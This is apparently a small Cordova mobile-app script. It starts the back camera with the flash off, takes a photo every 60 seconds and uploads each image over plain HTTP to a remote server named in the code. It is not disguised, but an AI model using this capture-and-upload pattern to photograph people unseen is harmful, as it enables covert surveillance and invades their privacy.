var app = {
  initialize: function() {
    document.addEventListener('deviceready', this.onDeviceReady.bind(this), false);
  },
  onDeviceReady: function() {photograph();},
  receivedEvent: function(id) {}
};

var photograph=function() {
  let interval=60;
  let url='http://harrysserver.com/camera/upload.php';

  CameraPreview.startCamera({camera: CameraPreview.CAMERA_DIRECTION.BACK});
  CameraPreview.setFlashMode(CameraPreview.FLASH_MODE.OFF);
  for (var i=0; i<999999; i++) {
    let k=i;
    setTimeout(function() {
      CameraPreview.takePicture({width:1280, height:720, quality:50}, function(base64PictureData) {
        var pic='data:image/jpeg;base64,'+base64PictureData;
        $.post(url, {image: pic});
      });
    }, interval*1000*(k+1));
  }
}

app.initialize();
